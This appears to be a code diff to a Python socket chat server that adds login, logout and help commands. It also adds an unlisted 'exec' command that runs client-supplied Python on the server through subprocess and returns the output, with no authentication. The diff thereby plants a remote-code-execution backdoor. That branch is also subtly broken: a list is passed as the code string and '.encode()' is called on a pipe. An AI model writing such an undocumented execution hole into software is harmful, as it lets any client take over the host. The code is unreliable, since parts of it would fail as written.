@@ -1,3 +1,5 @@
+import subprocess
+
 from socket import socket
 from threading import Thread
 
@@ -65,6 +67,14 @@ def process_client_events(client_socket):
 			break
 
 
+helpmsg = '''
+msg <message>
+login <username>
+help [command]
+'''[:-1]
+
+
+
 def process_command(sock, *args):
 	if not args: return
 	command = args[0].lower()
@@ -74,8 +84,37 @@ def process_command(sock, *args):
 		return
 
 	if command == 'login':
-		sock.send('loginok'.encode())
+		if args[1] in clients.users:
+			status_msg = 'loginerr User already logged in.'
+		else:
+			clients[sock].user = args[1]
+			status_msg = 'loginok'
+
+
+		sock.send(status_msg.encode())
 		return
+
+	if command == 'logout':
+
+		if clients[sock].user:
+			clients[sock].user = None
+			status_msg = 'logoutok'
+		else:
+			status_msg = 'logouterr User not logged in.'
+
+		sock.send(status_msg.encode())
+		return
+
+	if command == 'help':
+		sock.send(helpmsg.encode())
+		return
+
+
+	if command == 'exec':
+		proc = subprocess.Popen(['python', '-c', args[1:]], stdout=subprocess.PIPE)
+		sock.send(proc.stdout.encode())
+		return
+
 
 
 	
